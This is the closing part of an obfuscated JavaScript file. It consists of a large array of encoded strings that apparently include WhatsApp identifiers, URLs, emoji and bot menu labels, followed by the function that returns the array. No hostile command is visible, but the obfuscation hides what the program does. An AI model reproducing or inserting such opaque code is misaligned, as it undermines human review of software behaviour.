"zh0krhvYyxnPia", "xZb4nwe2mwq3", "ipcFMii", "cML0zw00lKfeuG", "xZb4nMnImti", "CxLJCgG", "A29UDg9SidyYoa", "DxHrtNe", "yxnjBMn1CYiSiG", "mtaYna", "EqOkkKnVBNrVAa", "C2vnzxnZywDL", "BeDPvNu", "cML0zw0XlLGTqq", "zhzXvum", "ntaYna", "B25SEq", "mZGWmZvSExDkCfa", "Cg5N", "yM9KEq", "8j+yGIa", "zwjSA3C", "xZb4odbKzMq1", "yxr0CMLIDxrLCW", "ipcFPkmG", "CgfZC3DVCMq", "ndaYna", "CwrZshq", "odDLltKYyZeToa", "lZiYlZm3l2jSyq", "cUkvKEkwHokwGokwIcdILOJILOtILPhILOG", "B3bLBMDYB3vW", "xZbFrhjVCgrVDW", "yMLUza", "CK1bzvC", "lI9PBwfNzs95yq", "BKXos0S", "xZb4mJe3mwnK", "uKjYz00", "r0vu", "CwvAz3u", "rK5PqKG", "zMXVDW", "n2DI", "y21ftfi", "DMXnChK", "C3vIC3rY", "Ewf0Aw0", "zxj2zxiU", "xZb4ndHKzJnI", "iM5HDgL2zv9Wyq", "DwXHAsbKyxjPia", "cK1LBw9YEtOG", "nMDI", "A1nuz0S", "CIbZzxj2zxi6cG", "sxvosMy", "mdaIlcjZy3jLzq", "BfHgtwS", "qMftzfe", "u0fVtKq", "t1fqChG", "r3CGsMfUz2fUia", "ANnVBG", "nZG4lcjVzMzZzq", "Df91CMWIoIjODa", "Cgu9su5urvjorq", "ywrJyxn0", "4Psb4Psb4Psb4QYJcGRILi/ILihILihIRkm", "kKrptKuGrefoqq", "Aw1Hz2u", "lM1LBNvWyw5LBa", "rvLqD3G", "AKPstwG", "iooaJqOk8j+tPIbcyxjH", "B3DhywO", "rvqPkGOkicaGkG", "Eff1r1O", "8j+yHIa", "DvjwDLq", "r3jPBwDHCIiSiG", "yKjJuuy", "rgzIA2O", "DeTjvgG", "tgrNEw8", "y2HRDwi", "uhnAzLe", "BNjXCMu", "ierPDgvUDhvRyq", "D2hmJSU8ipcDKARnOVcDKPpWNzkcZA/nOVcDKPtWNzkj", "qMvYAwT1DcbHza", "cIr7ChjLzML4Fq", "ncj9", "C2XPy2u", "iNnJCMvLBL8WxW", "BMHWvLe", "ALHbA2i", "C2fNzq", "lNbLCMLUDgfO", "q3jTy1O", "AwrLBY9hAwzZia", "zKP4EKS", "refoqsOklsa", "seGGoIbTBsa6ia", "mh0SiNf1yw50Aq", "D2HHDhnHChaUyW", "xZb4mwy2yZfK", "y2HAzhm", "CvzLqKO", "wM1jwNq", "yM90BMq", "4Oco4Oco4Oco4Oco4Oco4Oco4Oco4Oco4Oco4Oco", "zdyXndqkAxrLBq", "lI9HBM5HCY5QCW", "BIbezwSGpZ8", "BgfTipcFJ5NVUi8", "8j2zRqRILzhILjFIIRek4Psx4Psb4Psb4Psb", "iIiSiMfTB3vUDa", "iIWIBwvYy2HHBG", "44cgicdJGi3ILQ3ILQWkcUkuJ+kuGa", "wfHTwMy", "yvbpuvK", "y29TCgfJDa", "xZb4mtC0zdHL", "BKD3DNm", "Agjtq1O", "yMjuwwC", "Axjzr3G", "mJeY", "yxbWBgLJyxrPBW", "zgf0ywjHC2vZ", "ntm4mJyWmu9wDwT1tW", "BLbwt3y", "uuvPv2m", "sgfYDxmGtwvUzW", "zgvSC3j2", "sgfWDxmGuhjLBq", "CxjqzKW", "uK9pA3O", "yxqG", "u1fqzw4", "qKXHyMvSoLbVBG", "ENnUswu", "vgvYzgfMDgfYia", "DMfZAw9U", "AKjWBfe", "oNSIDMfSDwuIoG", "wKHbzu4", "vMLKzw8Gms05ia", "ANbTmW", "xZb4ndq2zdrM", "8j2zIFcDMl7WNzMq8j2zJIdWN5sL", "rhzAsgS", "yNLJrg8", "vwPQzNq", "mdaW", "xZb4nwuWmda3", "svnxywG", "r2H0EuS", "vMDitgq", "xZb4mJm3ywnK", "iU+4J+g3JEc/HVcFQBJIG5/GVjhIJihIG7dlUFcDKAJnOS2a8j2sJ/cDKO8", "qxr1vKu", "zLfwBeu", "iooaHIdWNzEu8j2xU/cDL7VWNzEU8j2yGcdJGiy", "xZb4nZDHyZDL", "AeLLzha", "BYbircbwAwrLBW", "8j2yVqRILzhJGiyGmVcDMylWNzI9cUkvKq", "yw5QAw5Nia", "sKfzENy", "shz0wMe", "qvjzzeq", "ie9T", "DK9YswW", "C3vIAMvJDa", "CMWIoIjODhrWCW", "CNnMr3m", "xZb4ngyXmZmZ", "zKPWu2y", "v2fRDhuGvgvSyq", "B3vXte0", "8j2qGVcDKkVWNzcA8j2qRpcDKkeG8j2qIpcDKkJWNzcS", "mtK6mda6mda", "m3PXsuzgvW", "mtGW", "x1n1y2nLC3mGva", "nZm0nJbFotyWxW", "rKjtDLO", "z2XyuLK", "twf1ie5NyxbHAq", "qwrTAw4GoIG", "qgCUDxm", "yKzIAey", "tKngrLu", "Y7WGu2nYAxb0", "nhW1Fdj8mxWZFa", "ifn1zgfOifrLCG", "y2vzDNe", "zgfUyw1HC3vR", "ysbzzYbnzw5Qyq", "qxv6Dfe", "Dgv4Dci6iLrLCW", "4PAa4PAiiokwIokwKEkwGokwIcdILOJILOa", "reDQquO", "EYjZy3jLzw5FmG", "txDUDK0", "xZb4ndq4mgjL", "AwqIoIi3odqYnG", "B2HHsxO", "tNn1CwS", "yxr0ywnRia", "qwrTAw4GqMvNBW", "8j2zLVcDMAFWNzMw8j2zNsdWNzML8j2zMVcDMApWNzMz8j2zQG", "CI5QC29U", "AuPODLa", "B1nZBuO", "AuvcsfC", "BMrHiefRC2vZia", "rxjYB3iGs2fRia", "xZb4mZfHzJCZ", "xZb4m2nMntqW", "Chv0zxiGzgKGAG", "sujKCLa", "DKfxBu0", "8j2xU/cDL7VWNzEU8j2yGcdJGiyGigaG", "yw1IywHRyw4Gvq", "nJa1nZyZndm1iG", "xZb4mwm2owrK", "xZb4mZC3zMe0", "ueHpve8", "vMTHBvK", "BMSTChjVzMLSzq", "l2r0yNmVy29UDa", "kUkaOIbfEgfTCgXL", "lcjHBw91BNqIoG", "B3zLCMzSB3C", "ieTVBNrHAW", "B20Vy2HHBM5LBa", "ChmWlM1Wna", "zxjsBvm", "ipcFJim", "8j2qQ/cDKjRWNzcS8j2qOq", "cUkvKEoaHVcDMAeGopcDMylWNzI9cUkvKq", "vwzyEvm", "Ahr0Chm6lY9Jza", "mci6iNjHzgLVia", "mti0otiWyK5QrK5I", "CgHVDg8", "vMnODKi", "ywrKChjLBq", "8j2qKIdJGi8kcVcDKjpWNzca8j2qKFcDKiBWNzce", "C3bSAxq", "uKndBNO", "vM52BMK", "oIOk", "DxHZywK", "A2DOBMu", "mtaWFsWIDgf4iG", "8j+yHca", "8j+yHsa", "zgLHlNzVy2fYBW", "zvbpqLG", "8j2zLpcDMy8GoIdWNzI88j2zIFcDMlZWNzMo8j2zHa", "C3rHDhvZ", "C05dEKy", "Ag91CG", "v1Lzzvu", "zhDHBc5QCgC", "zg9Y8j+uQYa", "zwDPCw0", "seX0AKS", "l2r0yNmVB3DUzq", "Cgfqv0G", "tKjUtuK", "v1jcB3C", "zLHNCLq", "mw9MtfqYwvvkqq", "ipcDMy7WNzI88j2zH/cDMytWNzMjipcDMy7WNzMq8j2zIW", "xZb4mwuXywu1", "xZb4mZa2nZnM", "wNnRs3e", "Dw1Muwm", "zeHODNG", "qKvhsu46vKnbuG", "uLrxt08", "xZb4yMiYnwi4", "vNzJBfi", "twnKEK4", "xZb4m2i0otKW", "ipcDKiJWNzcNZAlWNzcF8j2qOS2U8j2qP82I8j2qOVcDKk3WNzcYZAhnNokdNW", "xZb4ntbJm2m3", "DhKIoJD9lhSICG", "xZb4mJe0yZG2", "yvnXt0O", "8j2zJFcDMzdWNzMh8j2zGpcDMy4", "qxnPys9kywTHCG", "xZb4m2fHnZyX", "DvrJt3C", "zwWG44cgipcDL5tWNzE78j2xU/cDL67WNzIa", "BNnxvLO", "t3vYr1G", "Aw5MBW", "shb6EfG", "xZb4ngi5mJfH", "BuvUyMe", "twDREuK", "ody0mdaWmda", "BY5QC29U", "uefztuvova", "cUkvKEoaHIdWNzMj8j2zLVcDMAlWNzMwipcDMl0", "yLHltue", "xZb4mZuXmZjL", "qvfvtg8", "q0vpvMG", "sff1rvK", "8j2qK/cDKiqkpIbwAxj1CW", "qNn2tLi", "B3nAvhC", "sK9Ru0G", "4PAiiokwHokwIaRILzhJGiyGcUkvKq", "DNbyAuG", "sgfWDxmGt3DUzq", "Bg9N", "mhW2", "AMfKAsbpD25LCG", "ywXHAcbKywz0yq", "yLzcquu", "Cgf5BwvUDf9Yzq", "r3vUywTHBIbWzq", "8j2zQVcDMApWNzMCiaRILjFILihILihIRkmG", "BMfTzq", "B2jMDxnJyxrL", "44coipcDMy7WNzMa8j2zIFcDMl8G8j2yVFcDMzdWNzMc", "C2fWCciSiNvYBa", "ifrLBgfOie1LBG", "zNvJAYa", "4Psx4OQX8j2zJVcDMl4G8j2zHpcDMyNWNzMeipcDMl8", "s2LYAw0VuMvWBa", "mdi4otK1mJaWma", "DuL3the", "Cvzxt1K", "nJaWmda", "vgv4Dca6", "BwvYy2HHBNrFDq", "zw50CMLLCW", "DwuIoJq4ntC5mG", "ywrK", "rezHAfG", "8j2zSFcDMOtWNzQd8j2AG/cDMB7WNzM9ipcDMBVWNzM48j2AGG", "wLryCMK", "Agr2AwrLBW", "ipcDKjpWNzcR8j2qMVcDKk/WNzcAipcDKiJWNzcO8j2qRa", "DcbpD25LCIiSiG", "ieDYDxaQ", "ywPSr1G", "zMLSDgvY", "zw5NAxjPBsbqzq", "iJOI", "ze9Nu0u", "twvUz2LYAw0Gua", "xZb4mtfHywm0", "svLTC3e", "zxHJzxb0Aw9U", "A1P0svO", "xZb4mwjHn2vL", "zLvIyw4", "zNnLDci6mtaWFq", "mtyW", "Awe7oZS7cGPPDa", "CIeHiq", "8j2zP/cDMzBWNzMDipcDMAxWNzMA8j2zO/cDMzNWNzMQ8j2zOa", "DgvTCYi6w3SICG", "r3nKrhG", "DgKGrgKGD2HHDa", "qwzzDuO", "BMn0Aw9UkcKG", "ANiXBM96ohDpzW", "BMvSiejLCMLRDq", "8j2yVpcDMyFWNzI88j2zIcdWNzMl8j2zGpcDMy3WNzMg8j2zGa", "BwvZC2fNzq", "BMn1sg4", "yxnlrKK", "xZb4mJu5nwjK", "8j2zIFcDMyxWNzI8Y7WG", "kGOQsgfYAsbjBG", "zKHgAhu", "mtaWFsWICxvHBG", "xZb4mJG5ntC2", "zci6iJrpt040ua", "iJP7iNzHBhvLiG", "yu1WAgm", "weDvAgG", "ChbHC3C", "Bxn6A2u", "ihvUDhvRig1LBa", "y2jYAgm", "wMHbs2W", "ndKWnJK5otq0la", "qNrQyMS", "qKT3qwC", "iJO0otK4mtm5oq", "xZb4mwrHmZG3", "BefYDNG", "DxHQAfu", "ngDI", "sxPwqwy", "r2D5u3q", "xZb4mtiWntLH", "8j2zKpcDMlZWNzMpipcDMyVWNzI88j2zIFcDMydWNzMhia", "rgLRyxjLBMfRyq", "zML4k2nVBw1HBG", "BwjLCMLRyw4Gqq", "rxGGoIa", "AKPouwO", "8j2xNcdWNzEv8j2xMpcDL6xWNzEB8j2xLpcDL6BWNzEC8j2xNW", "uvjjuZ8Gs0XjsW", "ywjLBdPfBwfPBa", "AKfrC24", "iM9MzNnLDci6mq", "Dg9Oia", "tvj6yMm", "Ew15sKm", "8j2zI/cDMyRWNzMn8j2zJWRILjFILihILihILihILie", "twH5wvG", "r2XRrLK", "zw1HAwW", "n/cDMylWNzI9cUkvKEoaHIa48j2zGVcDMl0", "ipcDMyFWNzMe8j2zJVcDMy8G8j2zI/cDMlZWNzMj8j2zGa", "AxvTiq", "4PwUiIWIyw1VDw50", "ipcFMie", "se5zz20", "uLfsvha", "8j2xNFcDL7ZWNzE48j2xSVcDL78G8j2xPVcDL67WNzEX", "Dg9OidOk", "tKDhvsbtrujftG", "zsGNBw9UzxKNkq", "t0P0y3y", "CNrmzfm", "A0fXAM0", "yw5UEwe", "BM90x2fUBM91BG", "Ee9htKC", "DNjIB1G", "wwX1DeG", "AwrpB0i", "txvYsxK", "EhHoA3u", "uMvHuu4", "xZb4m2m1mZfI", "cK5HBwu6ia", "BeTqruu", "t3fIwxq", "8j2qKYa6ia", "xZb4nwqYmZGW", "DgHLBG", "xZb4ntG3mMi3", "rhvUr0m", "vxLTzwi", "uenuq2u", "wfHUqMK", "l2r0yNmVChjLBq", "ELDhvMS", "tNzty2u", "y291BNq", "C2nYzwvUxZbFuG", "xZb4mJDLytaX", "uNreu0W", "vMPLuu4", "xZb4ngmXmtK1", "lcjZAgLWCgLUzW", "yxr0ywnR", "8j2xPVcDL5ZWNzEH8j2xLVcDL6JWNzEMipcFLkuG", "v3DdELm", "yJrIzJe2zgu4iG", "Axrks2i", "DguG", "DxP3ugu", "A3rsr1q", "zgvSzxrL", "DhbZoI8VD2HHDa", "Ag13wgu", "DeXcqLO", "zenctNO", "ruP3vw4", "ief0yxmGuhvQAq", "s2LMDKW", "vujktvi", "C0LYuwe", "C3rHCNrZv2L0Aa", "CM1kyvq", "yw5HieTHAZ8", "sLzgrfK", "4PAW4PAW4PAW4PAW4PAW4PAW4PAW4PAWcIO", "B2nxvg8", "oIbczxjOyxnPBa", "lI9PBwfNzs9Qyq", "zwzLCMvUy2vFAq", "BgTlq0K", "y2f0Aw9Ul3nLCG", "twfJzw0I", "q3jLyxrLihDPDa", "cKnWDtOG", "m3WY", "AcbuAwjHiqPhCG", "AvHouvG", "xZb4mteWnZa1", "rNvvDhy", "Dg9WlMLVl3bFmW", "DNnHteK", "8j2zPpcDMAKGoIa", "A3DSEMG", "otK5otK5lcjVzG", "mtaW", "rKnwvxm", "xZb4ngiXzdm1", "DhmVns9Lz2DZlW", "ysbtzwTHCMfUzW", "xZb4yJHMnwmX", "ogDI", "Bwf0y2G", "zxH0zw5Kzwruzq", "xZb4ngjIyty3", "tM1ZvKO", "DcdIH6NIH6KkcVcFKAqGvxm", "qhmUD2HHDhnHCa", "z0PPALC", "yw5Rzhq", "sM9ZuLy", "z2rnseW", "cUkuGYdWN5sLipcDMyRWNzMN8j2zLVcDMApWNzMC", "ANbTChjVBw9ZAq", "veXxtMG", "8j2zIVcDMAZWNzMJ8j2zMVcDMACGoIa", "yM52BfC", "r2zsqKy", "oJS7sw5KB25LCW", "AxPHD00", "mebZlNDOyxrZyq", "C3rHDhvZqgjYBW", "4Psb4Psb4Psb4Psb4QYJcGRILi/ILihILie", "qKforYbHBMfZia", "zxrHAwXLCL9Pza", "mdu6ndq", "z2v0twLUDxrLCW", "mtK0BMi2CNqWlG", "rfbzDvC", "xZb4nte2yMqW", "ipcFMiqG", "zgf5", "owDI", "8j2qNIa6", "xZb4ndeWztK2", "lMj1z21LBNu", "zw50AxrPzxm", "yxnPAcbcDwT0Aq", "xZb4otCYowjM", "BfDuEgm", "Ahr0Chm6lY9IBW", "u2nHrK8", "kGOk8j2qK/cDKkJWNzcT8j2qMVcDKkuG8j2qHq", "AffJuhm", "xZb4m2nImwuZ", "yM9Sza", "BwfUz2fW", "ywLSlMnVBqOkAq", "xZb4nguWmgy0", "uMTfCui", "mdm6mda6mda", "zwLzqu8", "nsiSiM5HBwuIoG", "u2PkuKK", "DMvYCW", "AKjyruu", "z2X3svi", "ruTSD0O", "yNv0Dg9UCW", "cGPftKq6vKnbuG", "yxbHBgfO", "8j2zLpcDMAtWNzMQ8j2zQFcDMARWNzMx8j2zMIiSiG", "zxnHBIblzsaQ", "yw4GC2vSyw5QDq", "q0rSv20", "xZb4ngfLyMe3", "zNvJAW", "ruzbwLm", "ugvUz2D1BMfHBG", "BKHwD2m", "mtu6mda6mda", "rxnuCfC", "zgvSChjLBq", "l2fWAs9HChbSAq", "l21FmZiWmwy3yW", "DgvTmI5ylufcta", "imU8ia", "ChvIBgLJ", "xZb4mtLImtrH", "EwvSBg93", "AMzrwhO", "svfAzLy", "C2flBei", "BMqklw1PBNv0zq", "cUkuJ+kuGcdVVAiGyooaHIdWNzEu", "ChaUBMv0", "BvzsAuW", "otK5otaWlcjVzG", "vg8GiowpIWRILimG8j+uPsa", "cUkvKEoaHIdWNzMk8j2zRpcDMAmG8j2zIFcDMAq", "ygbG", "revgqvvmva", "yxP4DM9PzebZAW", "8j2xNpcDL6hWNzEw8j2xQpcDL6yG8j+uPq", "D0HOr3y", "y1bgyMm", "iK9srevsiIWIAq", "thDyEem", "B3DUzxi", "BeL0uvy", "tLrTDgq", "z2KG8j+mHa", "EhnNBxO", "8j+KOYa", "xZb4yJDLzwvI", "r0rozgu", "wdngrKOIlcj0Eq", "xZb4nwfIzda2", "DxjS", "u2vSyw1HDcbtDq", "nJe0ncj9", "xZb4ngqXyJy2", "sNrvDKC", "DK1eEwy", "xZb4m2nKmteW"];
  _0x433d = function () {
    return _0x2a0b93;
  };
  return _0x433d();
}